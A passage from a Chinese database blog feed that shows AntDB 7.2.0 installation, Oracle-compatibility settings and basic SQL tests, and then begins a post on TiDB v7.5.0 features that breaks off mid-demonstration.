<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">//:252</span><br><span class="line">         Rocky)</span><br><span class="line">             os_version=8</span><br><span class="line">             os_name=&quot;CentOS&quot;</span><br><span class="line">             ;;</span><br></pre></td></tr></table></figure></div>
<p>再次安装，遇到报错，提示缺少共享库文件。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">/home/shawnyan/app/antdb/bin/initdb: error while loading shared libraries: libcrypto.so.1.1: cannot open shared object file: No such file or directory</span><br></pre></td></tr></table></figure></div>
<p>需要安装 <code>compat-openssl11</code> 依赖。</p>
<p>再次安装，提示成功。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 antdb-ce-7.2.0.centos8.x86_64]$ ./antdb_install.sh -s</span><br><span class="line">[Info] AntDB install begins</span><br><span class="line">...</span><br><span class="line">/data/stonedb/antdb-ce-7.2.0.centos8.x86_64/setup/common/AntDB-license-agreement-Community.txt</span><br><span class="line">chown: invalid group: ‘shawnyan:shawnyanwheel’</span><br><span class="line">...</span><br><span class="line">[Info] AntDB install succeeds!</span><br><span class="line">[Info] AntDB init begins</span><br><span class="line">[Info] AntDB info:</span><br><span class="line">+----------+-----------+------+-------------------------------+-------+----------+</span><br><span class="line">| database |    ip     | port |             data              | user  | password |</span><br><span class="line">+----------+-----------+------+-------------------------------+-------+----------+</span><br><span class="line">| antdb    | localhost | 6655 | /home/shawnyan/app/antdb/data | antdb | antdb    |</span><br><span class="line">+----------+-----------+------+-------------------------------+-------+----------+</span><br><span class="line"></span><br><span class="line">[Info] AntDB logon:</span><br><span class="line">         adb -d &quot;database&quot; -U &quot;user&quot; -p &quot;port&quot;</span><br><span class="line"></span><br><span class="line">[Info] AntDB init succeeds</span><br></pre></td></tr></table></figure></div>
<!--
额外增加环境变量
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">export PGDATABASE=antdb</span><br><span class="line">export PGDATA=/home/shawnyan/app/antdb/data</span><br><span class="line">export PGPORT=6655</span><br></pre></td></tr></table></figure></div>
<p>–&gt;</p>
<p>此时，AntDB 已经初始化成功，并且启动，如上面信息所示，监听端口为 6655。</p>
<h3 id="连接-AntDB">连接 AntDB</h3>
<p>使用 <code>adb</code> 命令，连接 AntDB，并查看版本信息和数据库信息。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 ~]$ adb</span><br><span class="line">adb (13.3)</span><br><span class="line">Type &quot;help&quot; for help.</span><br><span class="line"></span><br><span class="line">antdb=# select version();</span><br><span class="line">                                   version</span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line"> PostgreSQL 13.3 on x86_64-pc-linux-gnu, compiled by gcc (GCC) 9.5.0, 64-bit</span><br><span class="line">(1 row)</span><br><span class="line"></span><br><span class="line">antdb=# \l</span><br><span class="line">                                  List of databases</span><br><span class="line">   Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges</span><br><span class="line">-----------+----------+----------+-------------+-------------+-----------------------</span><br><span class="line"> antdb     | shawnyan | UTF8     | en_US.UTF-8 | en_US.UTF-8 |</span><br><span class="line"> postgres  | shawnyan | UTF8     | en_US.UTF-8 | en_US.UTF-8 |</span><br><span class="line"> template0 | shawnyan | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/shawnyan          +</span><br><span class="line">           |          |          |             |             | shawnyan=CTc/shawnyan</span><br><span class="line"> template1 | shawnyan | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/shawnyan          +</span><br><span class="line">           |          |          |             |             | shawnyan=CTc/shawnyan</span><br><span class="line">(4 rows)</span><br></pre></td></tr></table></figure></div>
<h2 id="开启-Oracle-兼容参数">开启 Oracle 兼容参数</h2>
<p>AntDB 与 Oracle 数据库高度兼容，使得企业现有的基于Oracle数据库开发的应用程序无需做任何修改或只做少量的修改便可以运行在AntDB平台之上，由此降低了程序迁移的风险，减少了重写应用的成本，从而实现高效快捷的应用迁移。AntDB与Oracle数据库的兼容性包括两个大的方面：多模态SQL解析引擎和语法的兼容性。<sup class="footnote-ref"><a href="#fn5" id="fnref5">[5]</a></sup></p>
<p>AntDB 中的 Oracle 兼容参数，可以通过全局变量和会话变量进行修改。并支持打印相关调试信息，由参数 <code>debug_print_grammar</code> 进行控制。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">system</span> <span class="keyword">set</span> debug_print_grammar<span class="operator">=</span>t;</span><br></pre></td></tr></table></figure></div>
<p>修改会话变量，并测试 Oracle 语法：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> grammar <span class="keyword">to</span> oracle;</span><br><span class="line"><span class="keyword">show</span> grammar;</span><br><span class="line"><span class="comment">/*ora*/</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> dual;</span><br></pre></td></tr></table></figure></div>
<p>输出：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">antdb<span class="operator">=</span># <span class="keyword">set</span> grammar <span class="keyword">to</span> oracle;</span><br><span class="line"><span class="keyword">SET</span></span><br><span class="line">antdb<span class="operator">=</span># <span class="keyword">show</span> grammar;</span><br><span class="line"> grammar</span><br><span class="line"><span class="comment">---------</span></span><br><span class="line"> oracle</span><br><span class="line">(<span class="number">1</span> <span class="type">row</span>)</span><br><span class="line"></span><br><span class="line">antdb<span class="operator">=</span># <span class="comment">/*ora*/</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> dual;</span><br><span class="line"> DUMMY</span><br><span class="line"><span class="comment">-------</span></span><br><span class="line"> X</span><br><span class="line">(<span class="number">1</span> <span class="type">row</span>)</span><br></pre></td></tr></table></figure></div>
<p>查看命名空间信息：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">antdb<span class="operator">=</span># <span class="keyword">SELECT</span> oid, nspname</span><br><span class="line">antdb<span class="operator">-</span># <span class="keyword">FROM</span> pg_namespace;</span><br><span class="line">  OID  <span class="operator">|</span>      NSPNAME</span><br><span class="line"><span class="comment">-------+--------------------</span></span><br><span class="line">    <span class="number">99</span> <span class="operator">|</span> pg_toast</span><br><span class="line">    <span class="number">11</span> <span class="operator">|</span> pg_catalog</span><br><span class="line">  <span class="number">2200</span> <span class="operator">|</span> public</span><br><span class="line"> <span class="number">13391</span> <span class="operator">|</span> information_schema</span><br><span class="line">  <span class="number">9098</span> <span class="operator">|</span> oracle</span><br><span class="line"> <span class="number">13765</span> <span class="operator">|</span> dbms_output</span><br><span class="line"> <span class="number">13767</span> <span class="operator">|</span> dbms_lock</span><br><span class="line"> <span class="number">13781</span> <span class="operator">|</span> dbms_random</span><br><span class="line">(<span class="number">8</span> <span class="keyword">rows</span>)</span><br></pre></td></tr></table></figure></div>
<h2 id="简单-SQL-测试">简单 SQL 测试</h2>
<h3 id="创建序列、表">创建序列、表</h3>
<p>创建序列 <code>t1_seq</code>，创建表 <code>t1</code>，插入测试数据，并查询表数据。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> SEQUENCE t1_seq;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> t1 (id <span class="type">INTEGER</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> nextval(<span class="string">&#x27;t1_seq&#x27;</span>), name VARCHAR2(<span class="number">10</span>), c3 NUMBER);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> t1 (name, c3) <span class="keyword">VALUES</span>(<span class="string">&#x27;A&#x27;</span>, <span class="number">1</span>), (<span class="string">&#x27;B &#x27;</span>, <span class="number">2</span>),(<span class="string">&#x27; c&#x27;</span>, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span>, length(name) <span class="keyword">from</span> t1;</span><br></pre></td></tr></table></figure></div>
<p>输出：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">[shawnyan<span class="variable">@rocky9</span> <span class="operator">~</span>]$ adb</span><br><span class="line">adb (<span class="number">13.3</span>)</span><br><span class="line">Type &quot;help&quot; <span class="keyword">for</span> help.</span><br><span class="line"></span><br><span class="line">antdb<span class="operator">=</span># <span class="keyword">set</span> grammar <span class="keyword">to</span> oracle;</span><br><span class="line"><span class="keyword">SET</span></span><br><span class="line">antdb<span class="operator">=</span># <span class="keyword">CREATE</span> SEQUENCE t1_seq;</span><br><span class="line"><span class="keyword">CREATE</span> SEQUENCE</span><br><span class="line">antdb<span class="operator">=</span># <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> t1 (id <span class="type">INTEGER</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> nextval(<span class="string">&#x27;t1_seq&#x27;</span>), name VARCHAR2(<span class="number">10</span>), c3 NUMBER);</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span></span><br><span class="line">antdb<span class="operator">=</span># <span class="keyword">INSERT</span> <span class="keyword">INTO</span> t1 (name, c3) <span class="keyword">VALUES</span>(<span class="string">&#x27;A&#x27;</span>, <span class="number">1</span>), (<span class="string">&#x27;B &#x27;</span>, <span class="number">2</span>),(<span class="string">&#x27; c&#x27;</span>, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="number">0</span> <span class="number">3</span></span><br><span class="line">antdb<span class="operator">=</span># <span class="keyword">select</span> <span class="operator">*</span>, length(name) <span class="keyword">from</span> t1;</span><br><span class="line"> ID <span class="operator">|</span> NAME <span class="operator">|</span> C3 <span class="operator">|</span> LENGTH(NAME)</span><br><span class="line"><span class="comment">----+------+----+--------------</span></span><br><span class="line">  <span class="number">1</span> <span class="operator">|</span> A    <span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span>            <span class="number">1</span></span><br><span class="line">  <span class="number">2</span> <span class="operator">|</span> B    <span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span>            <span class="number">2</span></span><br><span class="line">  <span class="number">3</span> <span class="operator">|</span>  c   <span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span>            <span class="number">2</span></span><br><span class="line">(<span class="number">3</span> <span class="keyword">rows</span>)</span><br></pre></td></tr></table></figure></div>
<h3 id="创建、刷新物化视图">创建、刷新物化视图</h3>
<p>创建物化视图 <code>mv_t1</code>，并测试刷新物化视图命令。创建物化视图的同时，导入6条数据，再插入6条数据，刷新物化视图后，物化视图中有12条数据。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> MATERIALIZED <span class="keyword">VIEW</span> mv_t1 <span class="keyword">AS</span> </span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> </span><br><span class="line"><span class="keyword">FROM</span> t1;</span><br><span class="line"></span><br><span class="line">REFRESH MATERIALIZED <span class="keyword">VIEW</span> mv_t1;</span><br></pre></td></tr></table></figure></div>
<p>输出：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">antdb<span class="operator">=</span># <span class="keyword">CREATE</span> MATERIALIZED <span class="keyword">VIEW</span> mv_t1 <span class="keyword">AS</span></span><br><span class="line">antdb<span class="operator">-</span># <span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line">antdb<span class="operator">-</span># <span class="keyword">FROM</span> t1;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">6</span></span><br><span class="line"></span><br><span class="line">antdb<span class="operator">=</span># \d<span class="operator">+</span> mv_t1</span><br><span class="line">                                   Materialized <span class="keyword">view</span> &quot;public.mv_t1&quot;</span><br><span class="line"> <span class="keyword">Column</span> <span class="operator">|</span>        Type         <span class="operator">|</span> <span class="keyword">Collation</span> <span class="operator">|</span> Nullable <span class="operator">|</span> <span class="keyword">Default</span> <span class="operator">|</span> Storage  <span class="operator">|</span> Stats target <span class="operator">|</span> Description</span><br><span class="line"><span class="comment">--------+---------------------+-----------+----------+---------+----------+--------------+-------------</span></span><br><span class="line"> id     <span class="operator">|</span> <span class="type">integer</span>             <span class="operator">|</span>           <span class="operator">|</span>          <span class="operator">|</span>         <span class="operator">|</span> plain    <span class="operator">|</span>              <span class="operator">|</span></span><br><span class="line"> name   <span class="operator">|</span> oracle.varchar2(<span class="number">10</span>) <span class="operator">|</span>           <span class="operator">|</span>          <span class="operator">|</span>         <span class="operator">|</span> extended <span class="operator">|</span>              <span class="operator">|</span></span><br><span class="line"> c3     <span class="operator">|</span> <span class="type">numeric</span>             <span class="operator">|</span>           <span class="operator">|</span>          <span class="operator">|</span>         <span class="operator">|</span> main     <span class="operator">|</span>              <span class="operator">|</span></span><br><span class="line"><span class="keyword">View</span> definition:</span><br><span class="line"> <span class="keyword">SELECT</span> t1.id,</span><br><span class="line">    t1.name,</span><br><span class="line">    t1.c3</span><br><span class="line">   <span class="keyword">FROM</span> t1;</span><br><span class="line">Access <span class="keyword">method</span>: heap</span><br><span class="line"></span><br><span class="line">antdb<span class="operator">=</span># <span class="keyword">insert</span> <span class="keyword">into</span> t1(name) <span class="keyword">select</span> name <span class="keyword">from</span> t1;</span><br><span class="line"><span class="keyword">INSERT</span> <span class="number">0</span> <span class="number">6</span></span><br><span class="line">antdb<span class="operator">=</span># <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mv_t1;</span><br><span class="line"> id <span class="operator">|</span> name <span class="operator">|</span> c3</span><br><span class="line"><span class="comment">----+------+----</span></span><br><span class="line">  <span class="number">1</span> <span class="operator">|</span> A    <span class="operator">|</span>  <span class="number">1</span></span><br><span class="line">  <span class="number">2</span> <span class="operator">|</span> B    <span class="operator">|</span>  <span class="number">2</span></span><br><span class="line">  <span class="number">3</span> <span class="operator">|</span>  c   <span class="operator">|</span>  <span class="number">3</span></span><br><span class="line">  <span class="number">4</span> <span class="operator">|</span>      <span class="operator">|</span>  <span class="number">5</span></span><br><span class="line">  <span class="number">5</span> <span class="operator">|</span>      <span class="operator">|</span>  <span class="number">6</span></span><br><span class="line">  <span class="number">6</span> <span class="operator">|</span>      <span class="operator">|</span>  <span class="number">4</span></span><br><span class="line">(<span class="number">6</span> <span class="keyword">rows</span>)</span><br><span class="line"></span><br><span class="line">antdb<span class="operator">=</span># REFRESH MATERIALIZED <span class="keyword">VIEW</span> mv_t1;</span><br><span class="line">REFRESH MATERIALIZED <span class="keyword">VIEW</span></span><br><span class="line">antdb<span class="operator">=</span># <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mv_t1;</span><br><span class="line"> id <span class="operator">|</span> name <span class="operator">|</span> c3</span><br><span class="line"><span class="comment">----+------+----</span></span><br><span class="line">  <span class="number">1</span> <span class="operator">|</span> A    <span class="operator">|</span>  <span class="number">1</span></span><br><span class="line">  <span class="number">2</span> <span class="operator">|</span> B    <span class="operator">|</span>  <span class="number">2</span></span><br><span class="line">  <span class="number">3</span> <span class="operator">|</span>  c   <span class="operator">|</span>  <span class="number">3</span></span><br><span class="line">  <span class="number">4</span> <span class="operator">|</span>      <span class="operator">|</span>  <span class="number">5</span></span><br><span class="line">  <span class="number">5</span> <span class="operator">|</span>      <span class="operator">|</span>  <span class="number">6</span></span><br><span class="line">  <span class="number">6</span> <span class="operator">|</span>      <span class="operator">|</span>  <span class="number">4</span></span><br><span class="line">  <span class="number">7</span> <span class="operator">|</span> A    <span class="operator">|</span></span><br><span class="line">  <span class="number">8</span> <span class="operator">|</span> B    <span class="operator">|</span></span><br><span class="line">  <span class="number">9</span> <span class="operator">|</span>  c   <span class="operator">|</span></span><br><span class="line"> <span class="number">10</span> <span class="operator">|</span>      <span class="operator">|</span></span><br><span class="line"> <span class="number">11</span> <span class="operator">|</span>      <span class="operator">|</span></span><br><span class="line"> <span class="number">12</span> <span class="operator">|</span>      <span class="operator">|</span></span><br><span class="line">(<span class="number">12</span> <span class="keyword">rows</span>)</span><br></pre></td></tr></table></figure></div>
<h3 id="数据类型隐式转换测试">数据类型隐式转换测试</h3>
<ul>
<li>test case</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> t1 (</span><br><span class="line">id <span class="type">int</span> <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">name <span class="type">varchar</span>(<span class="number">255</span>) <span class="keyword">default</span> <span class="keyword">null</span>,</span><br><span class="line"><span class="keyword">primary</span> key(id)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t1 <span class="keyword">values</span> (<span class="number">1</span>,<span class="string">&#x27;123456789012345611&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t1 <span class="keyword">values</span> (<span class="number">2</span>,<span class="string">&#x27;123456789012345612&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t1 <span class="keyword">values</span> (<span class="number">3</span>,<span class="string">&#x27;123123&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> t2 (</span><br><span class="line">id <span class="type">int</span> <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">name <span class="type">bigint</span> <span class="keyword">default</span> <span class="keyword">null</span>,</span><br><span class="line"><span class="keyword">primary</span> key(id)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t2 <span class="keyword">values</span> (<span class="number">1</span>,<span class="string">&#x27;123456789012345611&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t2 <span class="keyword">values</span> (<span class="number">2</span>,<span class="string">&#x27;123456789012345611&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t2 <span class="keyword">values</span> (<span class="number">3</span>,<span class="string">&#x27;123123&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> t1.id id1, t1.name name1, t2.id id2, t2.name name2</span><br><span class="line"><span class="keyword">from</span> t1,t2</span><br><span class="line"><span class="keyword">where</span> t1.name <span class="operator">=</span> t2.name;</span><br></pre></td></tr></table></figure></div>
<ul>
<li>output</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">antdb<span class="operator">=</span># <span class="keyword">select</span> t1.id id1, t1.name name1, t2.id id2, t2.name name2</span><br><span class="line">antdb<span class="operator">-</span># <span class="keyword">from</span> t1,t2</span><br><span class="line">antdb<span class="operator">-</span># <span class="keyword">where</span> t1.name <span class="operator">=</span> t2.name;</span><br><span class="line">ERROR:  operator does <span class="keyword">not</span> exist: <span class="type">character</span> <span class="type">varying</span> <span class="operator">=</span> <span class="type">bigint</span></span><br><span class="line">LINE <span class="number">3</span>: <span class="keyword">where</span> t1.name <span class="operator">=</span> t2.name;</span><br><span class="line">                      <span class="operator">^</span></span><br><span class="line">HINT:  <span class="keyword">No</span> operator <span class="keyword">matches</span> the given name <span class="keyword">and</span> argument types. You might need <span class="keyword">to</span> <span class="keyword">add</span> explicit type casts.</span><br><span class="line">antdb<span class="operator">=</span># <span class="keyword">select</span> t1.id id1, t1.name name1, t2.id id2, t2.name name2<span class="operator">^</span>Jfrom t1,t2<span class="operator">^</span>Jwhere t1.name <span class="operator">=</span> t2.name::<span class="type">varchar</span>;</span><br><span class="line"> id1 <span class="operator">|</span>       name1        <span class="operator">|</span> id2 <span class="operator">|</span>       name2</span><br><span class="line"><span class="comment">-----+--------------------+-----+--------------------</span></span><br><span class="line">   <span class="number">1</span> <span class="operator">|</span> <span class="number">123456789012345611</span> <span class="operator">|</span>   <span class="number">1</span> <span class="operator">|</span> <span class="number">123456789012345611</span></span><br><span class="line">   <span class="number">1</span> <span class="operator">|</span> <span class="number">123456789012345611</span> <span class="operator">|</span>   <span class="number">2</span> <span class="operator">|</span> <span class="number">123456789012345611</span></span><br><span class="line">   <span class="number">3</span> <span class="operator">|</span> <span class="number">123123</span>             <span class="operator">|</span>   <span class="number">3</span> <span class="operator">|</span>             <span class="number">123123</span></span><br><span class="line">(<span class="number">3</span> <span class="keyword">rows</span>)</span><br><span class="line"></span><br><span class="line">antdb<span class="operator">=</span># <span class="keyword">select</span> t1.id id1, t1.name name1, t2.id id2, t2.name name2<span class="operator">^</span>Jfrom t1,t2<span class="operator">^</span>Jwhere t1.name::<span class="type">bigint</span> <span class="operator">=</span> t2.name;</span><br><span class="line"> id1 <span class="operator">|</span>       name1        <span class="operator">|</span> id2 <span class="operator">|</span>       name2</span><br><span class="line"><span class="comment">-----+--------------------+-----+--------------------</span></span><br><span class="line">   <span class="number">1</span> <span class="operator">|</span> <span class="number">123456789012345611</span> <span class="operator">|</span>   <span class="number">1</span> <span class="operator">|</span> <span class="number">123456789012345611</span></span><br><span class="line">   <span class="number">1</span> <span class="operator">|</span> <span class="number">123456789012345611</span> <span class="operator">|</span>   <span class="number">2</span> <span class="operator">|</span> <span class="number">123456789012345611</span></span><br><span class="line">   <span class="number">3</span> <span class="operator">|</span> <span class="number">123123</span>             <span class="operator">|</span>   <span class="number">3</span> <span class="operator">|</span>             <span class="number">123123</span></span><br><span class="line">(<span class="number">3</span> <span class="keyword">rows</span>)</span><br></pre></td></tr></table></figure></div>
<h2 id="总结">总结</h2>
<p>到此，AntDB 社区版 v7.2.0 的安装、适配已介绍完毕，并演示了 Oracle 兼容功能，以及部分 SQL 基础测试。</p>
<p>BTW，墨天轮课程中心上架了《AntDB ACA初级认证课程》<sup class="footnote-ref"><a href="#fn6" id="fnref6">[6]</a></sup> ，有兴趣的同学可以学起来。</p>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/1734117877862178816" >https://www.modb.pro/db/1734117877862178816 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<hr class="footnotes-sep">
<section class="footnotes">
<ol class="footnotes-list">
<li id="fn1" class="footnote-item"><p><a class="link"   href="https://www.modb.pro/db/1731856399742345216" >https://www.modb.pro/db/1731856399742345216 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref1" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn2" class="footnote-item"><p><a class="link"   href="https://www.modb.pro/wiki/55" >https://www.modb.pro/wiki/55 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref2" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn3" class="footnote-item"><p><a class="link"   href="http://www.antdb.net/news/detail/84" >http://www.antdb.net/news/detail/84 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref3" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn4" class="footnote-item"><p><a class="link"   href="http://www.antdb.net/download" >http://www.antdb.net/download <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref4" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn5" class="footnote-item"><p><a class="link"   href="http://www.antdb.net/72_benefit" >http://www.antdb.net/72_benefit <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref5" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn6" class="footnote-item"><p><a class="link"   href="https://www.modb.pro/course/196" >https://www.modb.pro/course/196 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref6" class="footnote-backref">↩︎</a></p>
</li>
</ol>
</section>
]]></content>
      <categories>
        <category>AntDB</category>
      </categories>
      <tags>
        <tag>AntDB</tag>
        <tag>亚信科技</tag>
        <tag>Postgres</tag>
      </tags>
  </entry>
  <entry>
    <title>TiDB v7.5.0 LTS 升级必读 | 新特性补充说明</title>
    <url>/2023/tidb/tidb-7.5-new-feature/</url>
    <content><![CDATA[<img  alt="tidb75.jpeg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231207-ea124805-d3bc-43ee-8115-79b85b203df6.jpeg"
                      referrerpolicy="no-referrer"
                >
<h2 id="前言">前言</h2>
<p>12 月 1 日，期待已久的 TiDB v7.5.0 LTS 发版。 <a class="link"   href="https://docs.pingcap.com/zh/tidb/stable/release-7.5.0" >TiDB 7.5.0 Release Notes <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<blockquote>
<p>作为 TiDB 7 系列的第二个长期支持版本 (LTS) ，TiDB 7.5 着眼于提升规模化场景下关键应用的稳定性。新版本中，TiDB 在可扩展性与性能、稳定性与高可用、SQL 以及可观测性等方面获得了持续的提升。TiDB 7.5 LTS 包含了已发布的 7.2.0-DMR、7.3.0-DMR 和 7.4.0-DMR 版本中的新功能、提升改进和错误修复，累计优化和修复功能 70 余项。</p>
</blockquote>
<p>前文中，我们详细地介绍了 TiDB Server 在 v7.1 到 v7.4 的新特性，彼时 TiDB v7.5.0 LTS 尚未发版。</p>
<ul>
<li><a class="link"   href="https://tidb.net/blog/8f6af887" >TiDB 7.x 源码编译之 TiDB Server 篇，及新特性详解（文末彩蛋） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<img  alt="img01.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231207-5447f5cb-9149-4346-9193-27a4db174b41.png"
                      referrerpolicy="no-referrer"
                >
<p>本文作为前文的补充，来观察一下该版本中的其他新特性。</p>
<h2 id="版本选择">版本选择</h2>
<p>前文中的彩蛋，这里更新了一下 TiDB v7.5.0 LTS 的发版日期。</p>
<img  alt="TiDBReleaseTimelineMap1201.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231207-67bd57de-0d14-4720-a654-94664b6fed50.png"
                      referrerpolicy="no-referrer"
                >
<p>关于生产环境版本的选择，是论坛里经常讨论的问题，如果明年有项目上线，又期望使用到新特性，那么 TiDB v7.5 LTS 将是首选。</p>
<p>至于 DMR 版本，强烈不建议上生产，仅可用于功能验证。</p>
<h2 id="DDL-ADD-INDEX">DDL: ADD INDEX</h2>
<h3 id="支持并行运行多个-ADD-INDEX-语句">支持并行运行多个 ADD INDEX 语句</h3>
<p>通过该功能，为同一个表添加多个索引的任务可以变为并发运行。以前同时运行 2 个添加索引语句 X 和 Y 需要花费 X 的时间 + Y 的时间，现在在一个 SQL 语句中同时添加索引 X 和 Y，并发运行后，添加索引总耗时显著减少了。尤其是在宽表的场景，内部测试数据显示同时添加多个索引的性能最高可提升 94%。</p>
<h3 id="支持设置-TiDB-节点的服务范围，用于选择适用的-TiDB-节点分布式执行-ADD-INDEX-GA">支持设置 TiDB 节点的服务范围，用于选择适用的 TiDB 节点分布式执行 ADD INDEX (GA)</h3>
<p>在资源密集型集群中，并行执行 <code>ADD INDEX</code> 或 <code>IMPORT INTO</code> 任务可能占用大量 TiDB 节点的资源，从而导致集群性能下降。为了避免对已有业务造成性能影响，v7.4.0 以实验特性引入了变量 <code>tidb_service_scope</code>，用于控制 <a class="link"   href="https://docs.pingcap.com/zh/tidb/stable/tidb-distributed-execution-framework" >TiDB 后端任务分布式框架 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 下各 TiDB 节点的服务范围。你可以从现有 TiDB 节点中选择几个节点，或者对新增 TiDB 节点设置服务范围，所有分布式执行的 <code>ADD INDEX</code> 和 <code>IMPORT INTO</code> 的任务只会运行在这些节点。该方法可以实现与其他 TiDB 节点的资源隔离，确保在执行上述语句时的最佳性能，并避免对已有业务造成性能影响。在 v7.5.0 中，该功能正式 GA。</p>
<p>在系统变量 <a href="https://docs.pingcap.com/zh/tidb/stable/system-variables#tidb_service_scope-%E4%BB%8E-v740-%E7%89%88%E6%9C%AC%E5%BC%80%E5%A7%8B%E5%BC%95%E5%85%A5"><code>tidb_service_scope</code></a> 的相关文档中，有这样一段描述：</p>
<p>如果集群内所有节点均未配置 <code>tidb_service_scope</code>，所有节点均会执行分布式框架的任务。如果你担心对存量业务有性能影响，可以对其中几个 TiDB 节点设置为 <code>background</code>，只有这些节点才会执行分布式框架的任务。</p>
<!--
https://github.com/pingcap/tidb/issues/46258
Enhance distributed task execution framework #46258
https://github.com/pingcap/tidb/issues/41602
Optimize multi-schema change for add indexes #41602
-->
<h3 id="实例演示">实例演示</h3>
<p>创建测试表，并行运行多个 ADD INDEX 语句，并在执行过程中，执行 DDL 的暂停、恢复。</p>
<ul>
<li>SESSION 1</li>
</ul>
